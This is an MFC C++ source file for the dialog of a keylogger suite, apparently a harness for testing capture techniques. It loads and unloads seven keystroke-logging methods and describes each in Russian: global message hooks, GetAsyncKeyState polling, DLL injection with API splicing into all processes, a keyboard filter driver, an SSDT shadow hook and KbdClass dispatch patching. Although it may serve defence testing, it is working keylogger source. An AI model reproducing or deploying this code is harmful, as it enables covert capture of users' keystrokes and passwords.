// keyloggerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "keylogger.h"
#include "keyloggerDlg.h"
#include "dbgoutputdlg.h"
#include "kd1.h"
#include "kd2.h"
#include "kd3.h"
#include "drvload.h"
extern "C"
{
	#include "kdprint\user\client\kdprint_cli.h"
}

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

KD1 kd1;
KD2 kd2;
KD3 kd3;

CDrvLoad DrvLoad;

/////////////////////////////////////////////////////////////////////////////
// CKeyloggerDlg dialog

CKeyloggerDlg::CKeyloggerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CKeyloggerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CKeyloggerDlg)
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CKeyloggerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CKeyloggerDlg)
	DDX_Control(pDX, IDC_BTN_KDSPLICE_STOP, m_BtnKdSpliceStop);
	DDX_Control(pDX, IDC_BTN_KDSPLICE_START, m_BtnKdSpliceStart);
	DDX_Control(pDX, IDC_BTN_KDWIN32K_STOP, m_BtnKdWin32kStop);
	DDX_Control(pDX, IDC_BTN_KDWIN32K_START, m_BtnKdWin32kStart);
	DDX_Control(pDX, IDC_BTN_KDDISPATCH_STOP, m_BtnKdDispatchStop);
	DDX_Control(pDX, IDC_BTN_KDDISPATCH_START, m_BtnKdDispatchStart);
	DDX_Control(pDX, IDC_BTN_KD4_STOP, m_BtnKd4Stop);
	DDX_Control(pDX, IDC_BTN_KD4_START, m_BtnKd4Start);
	DDX_Control(pDX, IDC_BTN_KD3_STOP, m_BtnKd3Stop);
	DDX_Control(pDX, IDC_BTN_KD3_START, m_BtnKd3Start);
	DDX_Control(pDX, IDC_BTN_KD1_STOP, m_BtnKd1Stop);
	DDX_Control(pDX, IDC_BTN_KD1_START, m_BtnKd1Start);
	DDX_Control(pDX, IDC_BTN_KD2_STOP, m_BtnKd2Stop);
	DDX_Control(pDX, IDC_BTN_KD2_START, m_BtnKd2Start);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CKeyloggerDlg, CDialog)
	//{{AFX_MSG_MAP(CKeyloggerDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BTN_KD1_START, OnBtnKd1Start)
	ON_BN_CLICKED(IDC_BTN_KD1_STOP, OnBtnKd1Stop)
	ON_BN_CLICKED(IDC_BTN_KD2_START, OnBtnKd2Start)
	ON_BN_CLICKED(IDC_BTN_KD2_STOP, OnBtnKd2Stop)
	ON_BN_CLICKED(IDC_BTN_KD3_START, OnBtnKd3Start)
	ON_BN_CLICKED(IDC_BTN_KD3_STOP, OnBtnKd3Stop)
	ON_BN_CLICKED(IDC_BTN_KD4_STOP, OnBtnKd4Stop)
	ON_BN_CLICKED(IDC_BTN_KD4_START, OnBtnKd4Start)
	ON_BN_CLICKED(IDC_BTN_KDWIN32K_START, OnBtnKdwin32kStart)
	ON_BN_CLICKED(IDC_BTN_KDWIN32K_STOP, OnBtnKdwin32kStop)
	ON_BN_CLICKED(IDC_BTN_KDDISPATCH_START, OnBtnKddispatchStart)
	ON_BN_CLICKED(IDC_BTN_KDDISPATCH_STOP, OnBtnKddispatchStop)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BTN_KD1_ABOUT, OnBtnKd1About)
	ON_BN_CLICKED(IDC_BTN_KD2_ABOUT, OnBtnKd2About)
	ON_BN_CLICKED(IDC_BTN_KD3_ABOUT, OnBtnKd3About)
	ON_BN_CLICKED(IDC_BTN_KD4_ABOUT, OnBtnKd4About)
	ON_BN_CLICKED(IDC_BTN_KDWIN32K_ABOUT, OnBtnKdwin32kAbout)
	ON_BN_CLICKED(IDC_BTN_KDDISPATCH_ABOUT, OnBtnKddispatchAbout)
	ON_BN_CLICKED(IDC_BTN_KDSPLICE_START, OnBtnKdspliceStart)
	ON_BN_CLICKED(IDC_BTN_KDSPLICE_STOP, OnBtnKdspliceStop)
	ON_BN_CLICKED(IDC_BTN_KDSPLICE_ABOUT, OnBtnKdspliceAbout)
	ON_WM_SHOWWINDOW()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CKeyloggerDlg message handlers

BOOL CKeyloggerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CKeyloggerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CKeyloggerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CKeyloggerDlg::OnBtnKd1Start() 
{
	if (!kd1.Start(m_hKD1DLL))
		MessageBox(TEXT("KD1 start failed!"));
	else
	{
		m_BtnKd1Start.EnableWindow(FALSE);
		m_BtnKd1Stop.EnableWindow(TRUE);
	}
}

void CKeyloggerDlg::OnBtnKd1Stop() 
{
	kd1.Stop(m_hKD1DLL);

	m_BtnKd1Stop.EnableWindow(FALSE);
	m_BtnKd1Start.EnableWindow(TRUE);
}

void CKeyloggerDlg::OnBtnKd2Start() 
{
	if (!kd2.Start(FALSE, 0))
		MessageBox(TEXT("KD2 start failed!"));
	else
	{
		m_BtnKd2Start.EnableWindow(FALSE);
		m_BtnKd2Stop.EnableWindow(TRUE);
	}
}

void CKeyloggerDlg::OnBtnKd2Stop() 
{
	kd2.Stop();

	m_BtnKd2Stop.EnableWindow(FALSE);
	m_BtnKd2Start.EnableWindow(TRUE);	
}

void CKeyloggerDlg::OnBtnKd3Start() 
{
	if (!kd3.Start())
		MessageBox(TEXT("KD3 start failed!"));
	else
	{
		m_BtnKd3Start.EnableWindow(FALSE);
		m_BtnKd3Stop.EnableWindow(TRUE);
	}		
}

void CKeyloggerDlg::OnBtnKd3Stop() 
{
	m_BtnKd3Stop.EnableWindow(FALSE);
	kd3.Stop();
	m_BtnKd3Start.EnableWindow(TRUE);		
}

void CKeyloggerDlg::OnBtnKd4Start() 
{
	PTCHAR DriverPath = GetAppPath();
	if (DriverPath == NULL)
		return;
	_tcscat(DriverPath, _T("\\kd4.sys"));

	if (!DrvLoad.Start(_T("KD4"), DriverPath, _T("KD4 driver")))
		MessageBox(TEXT("KD4 start failed!"));
	else
	{
		m_BtnKd4Start.EnableWindow(FALSE);
		m_BtnKd4Stop.EnableWindow(TRUE);
	}		
}

void CKeyloggerDlg::OnBtnKd4Stop() 
{
	m_BtnKd4Stop.EnableWindow(FALSE);
	DrvLoad.Stop(_T("KD4"));
	m_BtnKd4Start.EnableWindow(TRUE);
}

void CKeyloggerDlg::OnBtnKdwin32kStart() 
{
	PTCHAR DriverPath = GetAppPath();
	if (DriverPath == NULL)
		return;
	_tcscat(DriverPath, _T("\\kdwin32k.sys"));

	if (!DrvLoad.Start(_T("KDWIN32K"), DriverPath, _T("KDWIN32K driver")))
		MessageBox(TEXT("KDWIN32K start failed!"));
	else
	{
		m_BtnKdWin32kStart.EnableWindow(FALSE);
		m_BtnKdWin32kStop.EnableWindow(TRUE);
	}		
}

void CKeyloggerDlg::OnBtnKdwin32kStop() 
{
	m_BtnKdWin32kStop.EnableWindow(FALSE);
	DrvLoad.Stop(_T("KDWIN32K"));
	m_BtnKdWin32kStart.EnableWindow(TRUE);
}

void CKeyloggerDlg::OnBtnKddispatchStart() 
{
	PTCHAR DriverPath = GetAppPath();
	if (DriverPath == NULL)
		return;
	_tcscat(DriverPath, _T("\\kddispatch.sys"));

	if (!DrvLoad.Start(_T("KDDISPATCH"), DriverPath, _T("KDDISPATCH driver")))
		MessageBox(TEXT("KDDISPATCH start failed!"));
	else
	{
		m_BtnKdDispatchStart.EnableWindow(FALSE);
		m_BtnKdDispatchStop.EnableWindow(TRUE);
	}		
}

void CKeyloggerDlg::OnBtnKddispatchStop() 
{
	m_BtnKdDispatchStop.EnableWindow(FALSE);
	DrvLoad.Stop(_T("KDDISPATCH"));
	m_BtnKdDispatchStart.EnableWindow(TRUE);
}

void CKeyloggerDlg::OnBtnKdspliceStart() 
{
	PTCHAR DriverPath = GetAppPath();
	if (DriverPath == NULL)
		return;
	_tcscat(DriverPath, _T("\\kdsplice.sys"));

	if (!DrvLoad.Start(_T("KDSPLICE"), DriverPath, _T("KDSPLICE driver")))
		MessageBox(TEXT("KDSPLICE start failed!"));
	else
	{
		m_BtnKdSpliceStart.EnableWindow(FALSE);
		m_BtnKdSpliceStop.EnableWindow(TRUE);
	}			
}

void CKeyloggerDlg::OnBtnKdspliceStop() 
{
	m_BtnKdSpliceStop.EnableWindow(FALSE);
	DrvLoad.Stop(_T("KDSPLICE"));
	m_BtnKdSpliceStart.EnableWindow(TRUE);	
}

void CKeyloggerDlg::OnBtnKd1About() 
{
	MessageBox(_T("Тест KD1:\nУстановка глобального хука на сообщения посредством\nSetWindowsHookEx() из DLL."));	
}

void CKeyloggerDlg::OnBtnKd2About() 
{
	MessageBox(_T("Тест KD2:\nПериодический опрос состояния всех кнопок с помощью\nGetAsyncKeyState()."));
}

void CKeyloggerDlg::OnBtnKd3About() 
{
	MessageBox(_T("Тест KD3:\nИнжекция DLL со сплайсерами на GetMessageX/PeekMessageX\nво все запущеннные на данный момент процессы.\nГарантированно работает только на Windows XP SP2.\nВыгружается долго."));		
}

void CKeyloggerDlg::OnBtnKd4About() 
{
	MessageBox(_T("Тест KD4:\nДрайвер-фильтр на \\Device\\KeyboardClass0.\nРаботает на Windows 2000+.\nЕсли не выгружается, надо попробовать нажать любую кнопочку на клавиатуре.."));
}

void CKeyloggerDlg::OnBtnKdwin32kAbout() 
{
	MessageBox(_T("Тест KDWIN32K:\nДрайвер-перехватчик NtUserGetMessage/NtUserPeekMessage\nв KeServiceDescriptorTableShadow.\nРаботает на Windows 2000+.\nЧасто выгружается ОЧЕНЬ медленно\n(несколько минут) - какая-то нитка залипает в GetMessage.."));
}

void CKeyloggerDlg::OnBtnKddispatchAbout() 
{
	MessageBox(_T("Тест KDDISPATCH:\nДрайвер-перехватчик READ_DISPATCH(модификакция dispatch table) в \\Driver\\KbdClass.\nУстанавливает CompletionRoutine на верхнюю ячейку стека IRP(если возможно).\nРаботает на Windows 2000+.\nЕсли не выгружается, надо попробовать нажать любую кнопочку на клавиатуре.."));
}

void CKeyloggerDlg::OnBtnKdspliceAbout() 
{
	MessageBox(_T("Тест KDSPLICE:\nДрайвер-перехватчик READ_DISPATCH(сплайс на обработчик) в \\Driver\\KbdClass.\nУстанавливает CompletionRoutine на верхнюю ячейку стека IRP(если возможно).\nГарантированно работает только на Windows XP SP2.\nЕсли не выгружается, надо попробовать нажать любую кнопочку на клавиатуре.."));
}

PTCHAR CKeyloggerDlg::GetAppPath()
{
	PTCHAR DriverPath = (PTCHAR)HeapAlloc(GetProcessHeap(), 0, 512*sizeof(TCHAR));
	if (DriverPath == NULL)
		return NULL;

	if (!(GetModuleFileName(AfxGetInstanceHandle(), DriverPath, 512) &&	PathRemoveFileSpec(DriverPath)))
	{
		HeapFree(GetProcessHeap(), 0, DriverPath);
		return NULL;
	}
	
	return DriverPath;
}

//--------------------------------------------------------------------------------------------------------------------------------
// возвращает строку, в которой все \n заменены последовательностью \r\n
// строку надо потом HeapFree!
PCHAR PrepareStrForCEdit(PCHAR SourceStr)
{
	ULONG SourceStrLen = strlen(SourceStr);
	PCHAR CurrTargetPtr;

	PCHAR TargetStr = (PCHAR)HeapAlloc(GetProcessHeap(), 0, SourceStrLen*2+1);
	CurrTargetPtr = TargetStr;
	if (TargetStr)
	{
		for (ULONG i = 0; i < SourceStrLen; i++)
		{
			if ((i == 0 && SourceStr[0] == '\n') || (i && SourceStr[i] == '\n' && SourceStr[i-1] != '\r'))
			{
				CurrTargetPtr[0] = '\r';
				CurrTargetPtr[1] = '\n';
				CurrTargetPtr +=2;
			}
			else
			{
				*CurrTargetPtr = SourceStr[i];
				CurrTargetPtr++;
			}
		}

		*CurrTargetPtr = 0;
		
		return TargetStr;
	}

	return NULL;
}


#define DBG_OUTPUT_STORAGE_SIZE		0x1000

class CUserThread : public CWinThread
{
private:
	static CDbgOutputDlg *m_pDlg;
	static PCHAR m_pDbgOutput_Storage;
	static BOOL m_bInitComplete;
public:
	DECLARE_DYNCREATE(CUserThread)

	CUserThread() {};
	virtual ~CUserThread() {};

	virtual BOOL InitInstance()
	{
		CWnd Desktop;

		if (!Desktop.Attach(::GetDesktopWindow()))
			return FALSE;

		try
		{
			m_pDlg = new CDbgOutputDlg(&Desktop);
			m_pDbgOutput_Storage = new CHAR [DBG_OUTPUT_STORAGE_SIZE];
			m_pDbgOutput_Storage[0] = 0;
		}
		catch(...)
		{
			Desktop.Detach();

			m_pDlg = NULL;
			m_pDbgOutput_Storage = NULL;

			return FALSE;
		}

		Desktop.Detach();

		m_bInitComplete = TRUE;

		return TRUE;
	};

	virtual int ExitInstance()
	{
		m_pDlg->DestroyWindow();
		delete m_pDlg;

		delete[] m_pDbgOutput_Storage;

		m_bInitComplete = FALSE;
		m_pDlg = NULL;
		m_pDbgOutput_Storage = NULL;

		return CWinThread::ExitInstance();
	};

	static VOID WINAPI KDPrintCallback(PCHAR Str2Output);
};

IMPLEMENT_DYNCREATE(CUserThread, CWinThread)

CDbgOutputDlg *CUserThread::m_pDlg = NULL;
PCHAR CUserThread::m_pDbgOutput_Storage = NULL;
BOOL CUserThread::m_bInitComplete = FALSE;

VOID WINAPI CUserThread::KDPrintCallback(PCHAR Str2Output)
{
// ждем конца инициализации нитки..
	ULONG SleepCount = 0;
	while (!m_bInitComplete)
	{
		Sleep(100);
		SleepCount++;
		if (SleepCount > 20)
			return;
	}

	PCHAR PreparedStr = PrepareStrForCEdit(Str2Output);

	if (PreparedStr)
	{
		ULONG PreparedStrLen = strlen(PreparedStr);
		ULONG StorageStrLen = strlen(m_pDbgOutput_Storage);

		if (PreparedStrLen+1 < DBG_OUTPUT_STORAGE_SIZE)
		{
// строки большего размера не влазят
			if (StorageStrLen+PreparedStrLen+1 > DBG_OUTPUT_STORAGE_SIZE)
			{
// освобождаем часть буфера..
				StorageStrLen -= PreparedStrLen;
				memmove(m_pDbgOutput_Storage, m_pDbgOutput_Storage+PreparedStrLen, StorageStrLen+1);
			}

			strcat(m_pDbgOutput_Storage, PreparedStr);
			m_pDlg->m_EdDbgOutput.SetWindowText(m_pDbgOutput_Storage);
			m_pDlg->m_EdDbgOutput.LineScroll(1000);
		}

		HeapFree(GetProcessHeap(), 0, PreparedStr);
	}
}

CUserThread *g_pThreadObj = NULL;

void CKeyloggerDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	if (bShow)
	{			
		g_pThreadObj = (CUserThread *)AfxBeginThread(RUNTIME_CLASS(CUserThread));
		Client_InitKDPrint(g_pThreadObj->KDPrintCallback);

		m_hKD1DLL = LoadLibrary("kd1dll.dll");
		if (!m_hKD1DLL)
		{
			Client_UnInitKDPrint();
			PostQuitMessage(0);
			return;
		}
	}

	CDialog::OnShowWindow(bShow, nStatus);
}

void CKeyloggerDlg::OnClose() 
{
	if (!(m_BtnKd1Start.IsWindowEnabled() && m_BtnKd2Start.IsWindowEnabled() &&
		m_BtnKd3Start.IsWindowEnabled() && m_BtnKd4Start.IsWindowEnabled() &&
		m_BtnKdWin32kStart.IsWindowEnabled() && m_BtnKdDispatchStart.IsWindowEnabled() &&
		m_BtnKdSpliceStart.IsWindowEnabled()))
	{
		MessageBox(_T("All loggers should be stopped prior to closing application!"),
			_T("Stop!"), MB_OK);
		return;
	}

	FreeLibrary(m_hKD1DLL);
	Client_UnInitKDPrint();

	CDialog::OnClose();
}
